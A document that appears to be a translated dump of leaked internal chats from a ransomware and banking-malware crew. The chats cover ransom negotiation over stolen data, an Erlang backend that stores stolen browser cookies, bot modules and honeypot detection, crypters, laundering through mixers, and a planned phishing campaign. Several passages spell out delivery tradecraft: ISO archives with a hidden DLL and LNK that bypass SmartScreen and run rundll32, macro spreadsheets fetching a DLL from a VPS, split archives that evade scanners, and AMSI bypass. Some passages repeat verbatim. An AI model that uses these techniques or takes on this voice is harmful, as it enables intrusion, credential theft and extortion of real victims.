the same situation with erlang and kobol. as for training - it is possible to train, but it is expensive because i am actually training my competitors )
No ... the Earl is the most alive ...
if it's hipster - elixir)
it was good in its day, but now there is no one on the market for it and it is legacy
for example node.js - it appeared, it's established itself, it's on par with pcp now
it's all the same
it's the same boring shit ... can node parallelize ? ... and javascript is such a fucked up thing ) unsupported
what one guy writes - the other guy can't even maintain it)
no one cares what the language can do ?
only cares where to get a person to use it
if there's a resume for it, that's fine.
if not, the language won't be in demand
no one cares --- if you hammer nails with a microscope --- you won't get far
hye
yo
a ce ti ni kami ne govoil?
man
what cryptors would you highlight?
Hi I got it fine
which one do you communicate directly with yourself?
it's better to have a very bad language with very cheap specialists than a very good one with few specialists
I agree with you ... but if you think like that ... only the SI would be the most alive
i am telling you the real logic, that i and all recruiter's follow
yeah i understand ...
Of course it's possible to write websites on node) but to make a normal service... there's a responsible approach
what about elixir? it's the same as erlang
hi great
i checked with ford@ and viper@
what is your schedule when you are online?
is there a stable time ?
i don't know anything about him.
it's weird. he's more in the hot zone than Earl.
it's the same as Earl, but from the side... read it...)
kind of modern.
hi
so what's up with rasta --- it's worthless? )
i told you
it's good as an exotic in smallwares
smallwares aren't for me ... where can we find more intersecting points for each other?
what do you think your backend is for?
to collect some data ... but i'm not interested in that .
i'm not writing a client. so technically my hands are white.)
 https://privatlab.com/s/v/3Qn2ErZ42oHzB9rLoY9l
Aw;6?9w:@2
updated messenger screens with a payment window)
I'll think about it.
so you do not want to get your hands dirty )
here's a question
how is your DBMS?
standard ) with Scul ... all kinds of storages not very good . it is not my thing
I don't think a DB should contain business logic
I need a specialist in subdatabases
and on different ones, on lots of them, with good experience
should I be able to make a few parameters?
no
bigdata
what is it ?

Hi. How's it going?
What are your results?
What are the challenges?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
How do you do, how successful is someone, what ideas do you have?
Hi, about the blockchain - I did a little bit.
There's a blockchain with an issuer. No mining, could roll in for circulation of various liabilities, like square footage of a developer, etc.
the chat is hanging.

and what's up?
they're gonna ask for a decryption.
the test one
then a list of the date that we stole
and then we'll come to a consensus
on how much money they owe us

All right, we're just waiting.
Got it.)
is the second one still in the works?
or all with it already?
and also can it be that they should not?
Can there be a date to put it up for auction

and told them how much they leaked the dates
They should give us the files for test decryption and ask for a list of what we've stolen
Copy that. .
Keep me posted.
I'll let you know when they ask for it
what's the payment sentiment there

Don't ask me why...

look at the logs
if there's something there
You need access to see the logs.
and all send to each other
and i still don't have access
What does def say?
He's in charge of access.
Are you new here?
Yeah, I'm the second backender.
Def told me to text you.
and the backender -- you mean my replacement? are you in charge of erlang?
Uh, probably not.
[15.09.2021 20:08:42] <defender> still 403 ?
[15.09.2021 20:08:47] <Specter> yes
[15.09.2021 20:08:54] <Specter> is user agent obligatory?
[15.09.2021 20:09:10] <defender> no
[15.09.2021 20:09:22] <Specter> well then, here's the request above
[15.09.2021 20:10:22] <defender> send it to zoolas and ask what's wrong with it
I work with the driver
in short if it comes to the processing of 84 command ... then forbidden can only be here:

  {read_length, 64000},
 {read_timeout, 50,000}
]) of
 { ok, KV, Req00 } -> { KV, Req00 }
 { undefined, Req00 } ->
  throw(reply(forbidden, Req00))
this means either you have a big request body or the transit time is long.
the request flies away fast
Maybe it won't get here at all.
The body is not very good, too.
request size ?
95 bytes
Content-Length: 917
here's
That's not it then.
There was some kind of an update, they said.
Maybe the parameters are different
or something
There's also forbidden here: _ ->
 reply(forbidden, Req0) ... it's when the URL is incorrect, but yours seems to be correct
Can you check the logs?) or you also do not have access)
I forgot my one-time password.

I still need to get to the defence.
All right, I'll go harass the admin.

You need to look at the logs, it will tell you more specifically there
There may be in several places
Either there is a runtime error ... Or in CSV wrong format
Please check it. The driver says he was able to send normally. Maybe it depends on which server the pad is pointing to or something else
you have 8 columns in the csv ?
Did I do the math right?
I discounted the old request, but the new one has 10 fields and the same error comes in.

New format:
<b64(Username)>|<Browser>|<b64(Domain)|<b64(Cookie_name)>|<b64(Cookie_value)>|
        <Created,unix,Sec>|<Expires,unix,Sec>|<b64(Path)>|<IsSecure>|<IsHttpOnly>
Sec. I'll look for a new request.

Hi. Here?
I don't know.
You need to look at the logs.
Maybe there's an error.
We had problems with B64 and utf8.
It writes the data as it is. It's all textual.
I can't deal with it right now ... probably next week ... so try to get to my log ... if it shows up ... I'll try to fix it
quickly...
I do not need to deal with, I'm on vacation))
But to fix the problem with the format would be nice.
Besides you someone else fixes the source?
no
at least def can look at the logs.

and exactly to my server is the request?
no other ?
sec
admin says it's going to this server through the seal, everything's fine
there is something strange.
I found it by URL ... then I cleaned the log ... I queried again. The URL does not find it.
We have to restart the service.
It doesn't write logs after deleting files
or what
He writes
When he was in the log ... there was a error in the libs again
which works with POST data
Something is waiting for one thing and something else is inside.
in general i had sat down and updated all libs to the latest version . it would be easier then ... but it will be done later

Hi.

I got sick. Covid.
I got sick last Tuesday.
Until Friday I worked with a fever - everyone needs crypts.
But I don't have the strength anymore. I'm sorry, but I'm not an employee yet.
The test came back positive. And my sense of smell is completely gone this morning.
I'm writing you off because I don't know what will happen to me by Monday.
If I'm able, I'll write on Monday.
Would you be so kind as to write to Franz and Bentley? Collin still needs to be informed. Thank you.

Hi ... i don't know what to fix. Your guys are changing the client . They have something wrong ... and i have to figure it out and fix it myself. Don't you think something is wrong? For five years it was working, and then it "broke on my end" ...
they added fields.
They wrote about it in the confab.
You just don't want to get into the problem.

hi
Yeah, the number of fields is different there.
I'm guessing the database needs to be fixed.
He can't convert.
I did.
There's still a query error.
Just for the parsing of the fields.
Mismatch parameters count!
I looked at the code in the git.
It matched.
what do you mean ?
case binary:split(Row, <<"|">>, [ global ]) of
					[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ] ->
						SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )"
						{ok, _ } = db:equery(SQL, [ Group, IdLow, IdHigh, base64:decode(Username), Browser, base64:decode(Domain), base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path), binary_to_integer(Secure), binary_to_integer(HttpOnly) ]);
					Any ->
						lager:warning("Bad format of CSV row: ~p", [ Any ]),
						throw(reply(missing_parameters, Req2))
				end
here is an error
I see what's going on there ... you can see it in the log .
I think I know what the fuck is going on.
[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
this is bullshit . it can't match what came with what's needed .
Something else is coming in. More than 10 columns.
less comes in.
And it needs to be added to the bot.
to make the empty fields like || saw.
Right?
And any action causes a 403 error there.
Even if half of it is fine.
Well the number of columns should be 10.
If there is even one error in the general query, it will return 403?
I got that right.
What do you mean by error?
Well, the action will finish
processing
Well any action will of course terminate
throw(reply(missing_parameters, Req2))
Yes ...
That's it, it's clear now.
The error is not there.
I see you're becoming an Erlanger.)
what to do
i was promised pxp in general))))
syntax is a bitch, just like python)
so what's next in your investigation?
the syntax is super )
well, i like GO better
you need to check for empty fields, and if there's no field, it should just write a slash
instead of skipping
in any situation we need to look at the logs
like in the query I was given
in your software?
no
who sends this data?
Yeah, I guess so. 10 columns is the best.
but they send 6 or 10 or whatever and half of them are correct
[21:18:40] <mango> there's a guy with nets from 5 to 9k - take it?
and i didn't check that he's crashing in any case, not just skipping data
well, in short, the bourrats themselves
borats
yeah
well it is possible to skip the data
but will it help?
better to standardize
but bad queries should be ignored of course
instead of being dumped into the action
That's essentially ignoring it.
The answer to the client is fuck off.)
some of the data is valid.
okay, i'll talk to them tomorrow about what's best
if anything, we'll just remove the expression and that's it.
We'll just leave an error in the log.
I can process all data ... just the CSV assumes that the number of columns is the same for all data
Well, they have to guarantee that.

Hi
By the way, I think there, Adam said that there was something wrong with the dedic. I had made a couple of dedicates before that boby, but those were for linux, and all according to rocco's manual. Yours was a Windows one -- I did it all the same way. Basically the same, only one difference -- VeraCrypt instead of LUKS for the container. What else was wrong with it?

Hi.
Hello?
Hi. Yeah.
My informant that we work with on the payments sent me a message.
Please let your team understand that using the Suex exchange will cause a lot of issues.  

I can see conversations associated with this going forward.
Tell everyone who's in Conti
Ladas, of course.
did the cartoon send you?
Who's a cartoonist?
it's not like there's anybody there.
Spaniard
He's Romanian, though.)
No, he's not.
He's a negotiator.
I don't know why everyone calls him a Spaniard.
I get it.
I'll pass it on, thanks.
He's a canadian from a big rec company.
Does your crew wash the bits before they're distributed?
Mixers or something.
No. .
I get it.
It doesn't make sense.
We will make our own mixer for our needs in the future.
there is if you do it right
They're tracking bits like hell right now.
have you ever had a note that the locke deleted in the quarantine?
it is understandable
yes but we should just turn off the AV
You've got to be one step ahead of the curve...

Hi, about the test - I never got around to building it. On a virtual machine with microsoft build tools 2019 installed the project does not build via cmake - errors, not enough WIL and something else
It is obvious that the applicant is knowledgeable in the subject
But it is too complicated.
for now yes

the module's coder is on vacation and we need to receive data now
so we decided to do it on the server side, in dero

2. Then we replace all occurrences of |dXNlcg== with |<line translation>dXNlcg==
and then process

here's the problem
the module coder is out
what does this have to do with the module coder ... one person only works with the language in which the module is written ?

Hi. How's it going?
What are your results?
What are the challenges?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
Tell us how you are doing, what success, maybe there are some ideas?

Hi

Look, I do not understand you. You made a commitment on Thursday that you'll finish by the evening.
Then you unilaterally broke it and wrote that you'd do it on Friday.
It's Monday night, you wrote two hours ago that you'd do it now.

Where's the bottom line? How are we going to work with you from now on? I don't like that I have to stand with a stick and write to you, in the spirit of where, when, whom?
I count on independence and responsibility, I have a full carload of tasks, if in your face I can not get help, and will allocate separate resources for this process, it will not help the common cause.
On our part, you are all given, if you have any questions you can always write.
I will do my part to fulfill the part that you have undertaken.

hi, yesterday francis said that because of the complaint my salary is in question now and need to write to you. last week frank asked to extend his two test servers, they were not in the extension, because in August he said "...see..." about them, I do not remember exactly. i paid for these servers and they were 10min turned on all ok. i think the next day i wrote defender that frank complained about me and generally these servers important. i explained him the situation also, about their importance i first told defender himself, agreed that i would extend and ask customers about the extension when ordering, there was no showdown, with frank dialogue besides the extension was no more, only he apparently also wrote to francis, who sent me to you. before that there were also situations, but I took action, did a month inventory, tear down the system, updated all the lists, no problems. with frank's servers my responsibility, I should have gone to him myself, but I did not think they were needed at all

Hi, I'm writing you off. Our old case was renewed, the investigator said why it was renewed, the Americans officially requested information on Russian hackers, not only us, but in general who was caught around the country. In fact, they are interested in the trickbot, and some other viruses.
We were summoned by the investigator next Tuesday for a talk, but sort of as witnesses for now. But we'll be on 51 for now.
Also, as the investigator said, the case was extended until the end of October, that would hold a conversation with us. Because if the case is suspended, we can't be interrogated in any way, and in fact because of this they resumed it.  We have already contacted our lawyers.

Question: Could I get my salary? What would it take for me to extend my lawyer and take a vacation until the end of October? To get all this bullshit sorted out. The only thing is, I'll come by and give out routers every day. I give them out to thunder and def.

hi, yesterday francis said that because of the complaint my salary is in question now and need to write to you. last week frank asked to extend his two test servers, they were not in the extension, because in August he said "...see..." about them, I do not remember exactly. i paid for these servers and they were 10min turned on all ok. i think the next day i wrote defender that frank complained about me and generally these servers important. i explained him the situation also, about their importance i first told defender himself, agreed that i would extend and ask customers about the extension when ordering, there was no showdown, with frank dialogue besides the extension was no more, only he apparently also wrote to francis, who sent me to you. before that there were also situations, but i took measures, did a month inventory, tearing down the system, updated all the lists, no problems. with frank's servers my responsibility, i should have gone to him myself, but i did not think that they are needed at all
Hi, I'm writing you off. Our old case was renewed, the investigator said why it was renewed, the Americans officially requested information on Russian hackers, not only us, but in general who was caught around the country. In fact, they are interested in the trickbot, and some other viruses.
We were summoned by the investigator next Tuesday for a talk, but sort of as witnesses for now. But we'll be on 51 for now.
Also, as the investigator said, the case was extended until the end of October, that would hold a conversation with us. Because if the case is suspended, we can't be interrogated in any way, and in fact because of this it was resumed.  We have already contacted our lawyers.

Question: Could I get my salary? What would it take for me to extend my lawyer and take a vacation until the end of October? To get all this bullshit sorted out. The only thing is, I'll come by and give out routers every day. I give them out to thunder and def.

please send me my paycheck, my wallet

[14:17:59] <kagas> Hey, I'm sorry I got mad at you. I snapped at you, it's just family problems, sorting them out. The result on people will do. Now even fixed the chat, actively engaged in people.
Just no offense, sorry if anything. Can you please send me the second part of the salary if it's not difficult? I just to pay for the loan.
As stern will be, I'll write him that you discounted zp, but as if you were against it. He and I have a good rapport. It's not like it's the first day we've worked together.


Well, Chief, you are the one who is playing this game, you feel sorry for everyone, and they get used to it and sit on your neck. You should be online more often, and in some situations you should be tougher on them for educational purposes.

And then it turns out we are playing bad cop/good cop here, I fuss here, fuck all their brains to make them all work, scold when I see that there is no result, and then you are such a pie come and feel sorry for them all, warm, although the result from them is not. Everyone will get used to the fact that you can cry to Stern, and he will forgive you and give you money. I'm not going to teach you, you know everything yourself, I just reminded you once again.

on the third.
That's weird behavior.
I'll take a look now.
The modules seem to be loaded, but no data is sent to the logs.
Many have no data at all
Has the driver written to you yet?
[Error: the message is encrypted and cannot be decrypted.]

nothing at all
km maybe there are bots with 61 command?
although below writes that the start is successful
I don't know.
We have to figure it out.
They're about to upload.
[Error: message encrypted and can't be decrypted.]
It's most likely a honi.
I'm looking at the system
 	Microsoft Windows 7 Professional
normal send
 	Windows 7 x64 SP1
it is possible, but they say that almost no one
knock on the driver, he will send you the idi who sent
he's looking at the import logs right now
He sent it to me.
what do you mean no data?
Not a single module?
Yeah.
Contact love.
How do I download the log from the admin area?
Hi
[Error: message encrypted and cannot be decrypted.]
Retrieved
It says it's not coming from these honeys.
But it's weird that they're getting into the pink one somehow.
I wonder how?
some kind of data come?
don't forget about the soxes! i found a half alive one while it's encrypted
[Error: message encrypted and cannot be decrypted.]
soxes are done.
run your test ones to check if the data is sent from the modules
https://dnog7cgicmkrvugrfxexo34gikjbr54sd5skxj4r42aj4tuy2hjsw6qd.onion
what's hany in the pink, i think a long time ago mavelec did the appearance of bots there even empty
and run on the 3rd
the default in the 2nd for example, only those who have sent at least something get into the pink
ran the test one
LAPTOP-PC_W617601.15D4F2F3B95FBD39BBD4993FA177359D

the one I watched has 37
so they've learned to knock all the time
and receive modules
but not send anything

need to invent a defense against them
how to enable it only do not understand)

Hi
I tweaked the code there a little bit, I uploaded it to the git, check it out too.
This is a question you got what you did worked?
I poured on one admin in the work, and the second while testing do not want to touch.
Hi
Finally finished the second cookie format because there were changes, check if everything works for you
+= means a = a + b; //
You didn't specify the field in the sample.
And this one, there was a gigantic number in the output
I'll probably have to do a test next week to figure out what's wrong with the code.
I'm thinking how could we make autotests on all this folk's creations, even by hand or how... But that's probably for later too... I'll make redmine and backlog all my backlog tasks as soon as time is right.

I can't tell you yet.
Everything's under repair.
Approximately how long can the repairs last?
It's not up to me. I can't even guess yet.
[Error: Message encrypted and cannot be deciphered.]

[Error: message encrypted and impossible to decipher.]
I don't know. I told you right away. I'm not being funded right now either.
I got it. We'll wait then. My patience is a little shaken.
How is it shaken? It's not like we're in a factory.
We've been paid for almost a year, but no one's been working.
It shook in terms of getting a new job or waiting here for work.  I have no extra income. And the fact that they almost didn't work for a year, it's not up to me. In turn,I am in touch and ready to immediately perform the tasks assigned.
bro here? there's a very interesting corp for you. fuckin' interesting. 60k ravenu there and a bunch of balloons connected
It's a big network.
Look, I explained the situation. Nothing depends on me yet.
No results, they stopped paying.

Hi
Could you extend the server?

24/7. I have a feather for coding.
How about you?
The price went from $1.50 to $6,532 per coin on Cucon today at the time of listing.
Fucking hell. .
How's that?
In one minute. Then it went down to 2,500-400-40. Now it's 5.66.
))))
Something's messing with the exchange rate.)
You know anything about crypto?
Do you know anything about blockchain in general?
I track the price from the first second and can place a buy. There's no risk for say 100 bucks. But in the worst case you could sell it for twice as much.
Let me give you 2k.
you get back 4)
I read the blockchain. And watched the codes. But not a theorist.
We need a lot of blockchain people.
You may have heard about the chief's desire for a social network.
I'm attracted to all the exchanges to track quotes, get signals from media and social networks and make sales purchases at once
vk for darknet))))
I would love to be that kind of person
cause I have a thing for crypto.
I think about you all the time.
you
You need to understand how you can be useful to us, what experience you have beyond crypto and so on.
It's bad when you have money lying around without any use.
the project is big and complicated.
ghbdtn
hi
3ESoHu87mTrFNSNUaMVEfT3vYwRYGfSHQ
there will be a stock exchange and you can make coins for the teams and a lot more
drop me a line after you read it
I have the experience of being completely free with my time and spending it on programming makes me happy.
I have recently become very fond of our team.
It's okay for those who work.
Are you in the details on blockchain?
there are guys who came in six months ago and already make more money than me)
it depends on what you do.
Don't be jealous.
I'm only glad
i gave them all a raise)
Wait a while and the money will cease to exist for us.
It's just a number you can inflate however you want.
I don't mean envy.
you believe in crypto, don't you?
Write your thoughts in the form of a report.
darknet calculation.
It's just that our collective has a super-perspective for development.
I know that crypto's not regulated until it goes into fiat.
how do you see the security theme for such a platform and what would be the weaknesses
it depends on how you withdraw.
and so any number of people can be linked into working collectives
yup
if you have any friends you can get involved with.
who's fun to work with
The only place where you can boost crypto-exchanges.
And you can mine.
My boss said so.
You could do projects and liquify them in tokens.
The main thing is to make them in tokens, it's brilliant, but it requires a lot of effort.
I like to make a social network first of all for myself and the community, in order to replace obsolete sites and so on and so forth.
My hobby does not require anything. I just want to make quick transactions.
And we will develop it as a commercial project with support, should become like carbon black antivirus - only for hackers)
I've read the chef's whole thing. And so has Buzu. I'm all for it. I'd like to be in it for the rest of my life.
Here we go.
A commercial crypto project - if you're an expert, that's ridiculous.
once you read it, take the initiative.
Crypto is not a substitute for money.
He rarely offers anything himself, but he likes someone who cares, and someone who takes the initiative.
We need good teammates who know how to set goals, although they have been good friends with 3 yap
there is a lot to do and no one to work with))))
So the initiative takes time. I program the bots honestly. I got Dane's (Van) texts. I'm immersed in them now. I'm optimizing them now.
you only do crypto, right?
Jap -- languages?
are you talking about bk or tric?)
Yeah. .
I don't do crypt, I do bk.
You build build builds, don't you?
not stupid, but creative.
bk is a weak project frankly
all the adverts are complaining
There are constant updates from Collin. And there is a real movement.
The tricks are so weak there are a lot of detects.
The very subject of bots also beautiful.
Collin's a good guy.
I wish we had 10 more like him.
That'd be great.
He's very good.
If you got any good friends, bring 'em too.
We will.
With different skills for different tasks.
Don't you push me away. I'm yours.
I don't need money.
I need people for blockchain.
It's all just some kind of kinky fantasy, but it's real.
and the boss seems to approve of all this spending.
it seems to be either self-made according to the classics, or you have to do it on smart contracts by vu Buterin on the air?
how did you choose?
what is the closest to you in terms of blockchain and social networks?
we'll take from ubutik.
When I was drafted, I did a little research, got some projects to try out. I got fed up and forgot. This is what we need to be specific to support.
The task is to make a social network with a username and a password, a private key, and you as a hacker all in one site. Once everything is nice on the site, we will make an application out of it. You will not be limited in terms of functionality.
Here is the timing of trading on the stock exchange and the speed of spreading signals rnovosti-that is concrete.
There are spheres, you can download and launch, and you are a hacker.)
Who was the first to know and shoot, he takes the bank.
I'm not about the money again, but about the technical idea.
I get it.
And the Cheyenne platform and services are awesome.
you should probably go to baguette to support the crypto exchange.
It is not clear just how they decentralize and quickly search through all distributed blocks.
It is necessary to experiment and feel.
Everything is there for that
Yes, I have experience is the son of mistakes of the game. But I'm only in terms of learning.
I also have a goal and practice a powerful development complex.
A lot of machines a lot of providers in the apartment. Monitors, memory, speed.
Do you do the nets?
I love it.
If you want a lot of money, all the money is in the grids.
I want the algorithms themselves to talk to each other 24/7.
No, I'm not hacking.
do the nets pulses there fortiki ciski
I'm building
they can be brute-force on good hardware
I used to spoof when traffic was expensive and they stole 200 bucks from me.
and there's 2 or 3k from one net and 25% of the success just for giving you access
I had the whole house supporting me. Without knowing it
not 2-3k
all the money is in the nets bro
here osinty help us a lot of things to do, chats there taken care of and all this az 1%. but they and the percentage are happy) there on 5-10k they flies from the grid
Shit. I wanted to bet 30 bucks today. Just as a probe, to see if there's any movement in their records. When it hits the exchange, when the order is realized.
And I wonder, when the multiplier on this listing got to x6000, how much would I sell these 10 contracts for?
I mean, at 400, that's x100.
So how much would I have ended up paying?)
That's why I have to be kept close to the capital turnover.
not for how much. I did not put a prokshchena not yet. Observing. I have.
So far only telegram confidently scanning and scraping Binance news site.
you're doing it all wrong))))
Issuing a warrant is a one-time thing. There's nothing to do. But the timing has to be right. I'm timing it.
It's a hobby.
I just told you about the listing. You have no information about what's going on there. How the organizers distribute fake stuff for pennies, how then a small crowd of 500 slots come to trade, how it all sinks into the exchange.
well
it's a harsh world))))
early bird gets first dibs...
https://trade.kucoin.com/SOLR-USDT
here's an illustration
The point is not to be the master of the world, but to be there at every leap.
And to know that it is always easy and legal to take (as much as you want).
By sous vide watching the fight, not participating
But blockchain I'd participate in the scrum too. The topic itself is fire. Frantic!
Dex and everything else. Gaming, information systems
I find it funny when politicians discuss how swift is going to screw us and how hard it is to import it. It takes a long time to pay, it costs a lot. Do they have no programmers at all?
Of course
There's only a handful of smart guys
The rest are more like clingers
and there are grown-ups sitting there, they're talking about developing the industry... so you have to do it.
It seems to me that politicians and bosses don't do anything.
If you want to take part, write a report about what the topic is close to, why it's close, what are the perspectives, and how we can use it in a social network for darknetworkers)
Compared to bitcoin whales
they say what they are told)
you are so smart
what's the forecast for November bitcoin/ether
that's why the noise is going on, the salvador is going to go to the state, the chinese are banning it, the sbercoin is showing up.
October november
I don't really care about the exchange rate. Since my main thing is to increase the coin.
The fat guys behind the closed doors have decided everything)))) we just have to guess what will happen
The bitcoin needs to grow and the digital dollar needs to grow in proportion.
Well, everyone's a little wary of crypto.
If the rate fell, I bought some bitcoins, if the rate went up, I sold them, but this is trading and investing.
But this is trading and investing.
That sucks.
\Tomorrow they'll take it away from you and what are you gonna do?
You have to look for the points where you're getting charged.
and get it out of the trusted guys.)
It could be instant X's, but the main thing is that it's guaranteed.
It's better to overpay a few percent, but not by yourself.
Might even take away your life
Life should not be taken away)
while at this point we have already discussed, is the ability to work with people
with any amount. If there are bits
Well, good) we'll deal with the bits
And they need to grow. Not on the course but on operations.
I'm going to bed.
Good night.
Good night. I'll come to you first if I'm busy.
I'm bored alone.

I'm sorry, I'll just say this one last time.
You don't have to think about how to get it out. Let it grow!

Listen, have you worked with Sphinx?
Or any other search engines?
hi, but i've worked with mnogosearch extensively.
Sphinx was set up for site search.
But that was like 7 years ago.
I mean, there were older versions.
what about it?
but it's easier to search there, it's through spider
I can not solve the problem with the sphinx, I've searched all the forums and asked everyone I could
There is roughly speaking Url and a piece of Url it does not seek no matter what I do.
Shielding does not help, changing the format of the fields and the index, too

Hi man, I'm pausing the accesses for now!
i uploaded the patcher yesterday.
send me the credentials.
That's good, I'll be able to look later.
What about the patches on those tascas?
I'm making one at .
You also uploaded?
Seems like everything's fine.
Ok, you've got one more small patch there to change the width of the field and nothing else in the plan this week.
It's cool that you came up with the patcher yet.
Yeah I saw that.
I'll try to close the sprint on time.
If you can make it on time, good, no next week it means. On Mon we'll discuss what to do next
I try to make the job easier)
)
engineers are lazy people)
i used to work as a cryptor, and every day i was crypting software, but i got so fed up, that i wrote an autocrypt polymorphic one, which was clean for almost 6 months, and i just watched movies)
Hi)
listen, please give me the firm that the first guy couldn't handle
:) Cool experience.
Basically, a good job is when things are stable.
Not when people are exhausted and in overdrive.
That's what you should strive for.
I agree.
We've got to get things in order here, too.
I've seen this place run like demons.
That's not good.
because I switched laptops and lost my firm.

i don't see him in the rocket
it's a mess, no one is responsible for anything and so on

I'll solve all the problems with the shooters
I'll make an important point.

so once they're all sorted out amongst themselves)))))
then the operators will start calling
it is not clear when it will be.

Hi
Can you give me access to a server

♪ and give you a working Xbox ♪
♪ with a working def ♪

♪ tonight  ♪
Can you do it by 7:00 p.m.?
Wednesday attack
i have to have a land somewhere + a spare land so i can quickly transfer it to the operators

can you do it by wednesday?
if they let me test it myself at 7:00 p.m.
everything works.
and by wednesday we'll have the different crypto loider ready to go and the tricks.
then on wednesday we'll start the attacks from 11am to 6:30pm
but most likely even on Thursday.

decide when everyone will be able to be here to adjust everything on the spot

you need clean loaders from the deplude pack to put them in the lend
Landings + spare on another host have azur or amazon
Preliminarily on wednesday operators will prepare objects

crunchbase access is necessary

Yeah.
Wednesday, we'll attack.

It's a deal.)
I'm sick of the fucking wind and the cold.

it all sounds like a plan to action
I've been warned about.
Okay.
I want to avoid stress for a few months.
And to do that, we have to go on vacation with you as a team.
I wonder when they'll run out of patience)
We'll see.
Oh, my gosh, my toad got stuck and I missed you.

I have a lot of questions as always)
this week there may or may not be any loaves
let's see if we can get back to work
on the topic of lowades
bouza says davu all ready to go
no one can make a server and set it up
They gave us three people to do the servers.
So, dey says it's a mess.
♪ and everyone's talking ♪
It's dragging on and on.
Booza says there's no action.
it's already a mess on the coders' side and the servers here
deyv says he's doing everything and how he's releasing the operator's backends
I'll make an important point.
as usual.
everyone is busy with their tasks, used to do what they did, and everyone delegates to someone else)
mess, no one is responsible for anything etc.
it is not clear when it will be
so how they work it out amongst themselves is unclear)))))
Let's wait another week.
the operators will start calling
just objectively
Boosa is a beauty.
shambles
as soon as all the issues are resolved, then we will join, my guys are ready to extract objects
not ready to give out the echo yet
[15:08:02] <buza> have him contact me, we'll exchange contacts
[15:08:08] <buza> I will solve all the problems with the shooters
if you are interested
it's a mess worse than it was before
and you're a beauty.
it doesn't stop you from making money
postrow this structure
The booze has taken over everything in a hurry.)
but it's all down to a couple of people.
let's see
the rest must be kicked)))
but it is not certain))
2 weeks with servers to solve the problem, what the f*ck))
[15:19:01] <buza> as soon as we start talking to you, immediately loses connection everywhere, all channels

Hi
Bingo)
Listen, do you happen to have any ready-made base of random names?
First name, last name, I mean.
I can give you one right now.)
hi
You know where I get it.
I also need a crypt with bytes.
tell telnet I asked for a group with which bytes you can change information in the crypt from which to which bytes
Go ahead, suggest a place, I'd appreciate it.

You just set the parameters.
and the file comes in the mail.
Great!) Thanks already see that I have this resource is clearly useful and more than once)

Anyway, let's do this. I've missed something in the year I've been busy in real life, but I have some base too. We can try to find intersections of mutual benefit

" [19:08:15] <rozteka> I have docked for a very long time and can't find someone to do
There is a dock.
Somehow, but it works.
Dock def bypasses?
Yes, of course. The most important criterion.
We used to have a better one, but that person is no longer in the thread. There are questions about what we have, but it still works and is clean enough.
My locker and dock used to be twittered too.
Ostap was a looder.
<Hash> I'm starting to fool around with webmail now, it has an implementation of google drive link
[19:10:28] <Hash> But I don't know shit about it.
Who's there to consult?
formulate your question.
A link to the drive. What's being posted there? An archive/naked attachment? Is it just one link or a bunch of links?
From what I recertified yesterday.
archive
It doesn't matter what drive.
I can tell you about it on the Wonder Drive.
it's essentially a chrome bypass.
so there's no alert and the download drops right away.
to a folder on the victim's machine.
Yeah, that's probably it.

"Link one or do they generate a bunch at once?
Maybe there are automators. on some zennoPoster either on the forum or on order to leave. myself have not seen.
there is an apploader on your drive
pay attention
on prometheus
on the expe for 200 or so.
rocket's down
i would be very grateful to you if you could help me build the doc. what do i have to do?
The only thing that confuses me is the archive. It's just, I'm back in the good old days when archives and other crap weren't necessary if you had a good dock. And compared to a dock, an archive with the same almost but crappy dock gave less results
10 minutes, I'll be back to tell you.
I understand. .
There's another trick, you know.
You send the archive.
And there's a .js in it.
and you're detected immediately by the extension
How do you get around it? It's easy.
Archive, and it slices the archive into 2-3-4-5 parts (5-10 Kbytes each). opening the first one, the following ones will be downloaded and it goes through the victim and cuts off keyword analyzers.
Read more you know what to train your mind
Nobelium attack
on mikrosoft description. I stole from there the method with ISO + hidden DLL + LNK
stole *

"ISO + hidden DLL + LNK
This is a kind of container turns out?
Simply, there is such a suggestion for an attachment. Let's call it a "container". I haven't had time to evaluate it.
There is also an ink in it.
Yes. The link to bypass the smart screen and run randll32 1.dll.
And the result? Or is this way out of date?
So far it's been the most penetrating.
I've been doing the technique before.
js vbs exe
In general look, under the dock, or to be more specific, it's not a dock but an xlsm table. You only need a vps to put out the dll. There is one problem with this xlsm - no protection. I can advise you to use black tds as an anti-bot protection
js vbs might still make sense but you need someone who can bypass amsi
OK, so I need the domain and the file to the DLL, right?
What's your entry point?
You can use any entry point you want. Just let me know if it differs from your default one.
[Error: message encrypted and cannot be decrypted.]
Okay. I'll leave the domain with the I.P.S. on the order now.
[Error: message is encrypted and cannot be decrypted.]
I don't need the domain.
Just a link with an ip.
Well you can with domain if you want :)
I got it. I put it on the order.
Also, check this out.
We used to use Js a lot back in the day.
https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/
fellow spammers. all the tricks at once.
We had a js loeder with a defense package packed in the dock.
There was a protection package against letting the maiload itself go where it shouldn't.
like process check, snapbox detection?
Yes
Plus network detection, number of machines on the network if it's not a single machine.
Av, network...
That was the ostap loader.
So we already had a clear idea of what and where to load, without all the fiddling.
Now we can't do it?
[Error: the message is encrypted and cannot be decrypted.]
[Error: message encrypted and impossible to decrypt.]
You can only implement it if you have the right level of coder. There are no such coders for two reasons. 1. We all got into a fight at some point. 2. The coder at some point realized that everything went too far and after reading a couple of revelations showed a Bender's Ostap style trick and disappeared.
What language do you need the coder in?
Js

"The coder realized at some point that things had gone too far.
he didn't know what he was doing and he was on 1k a month, right? :)
No, he knew and he wasn't 1k a month :)
It's just that his cuff was getting tight.
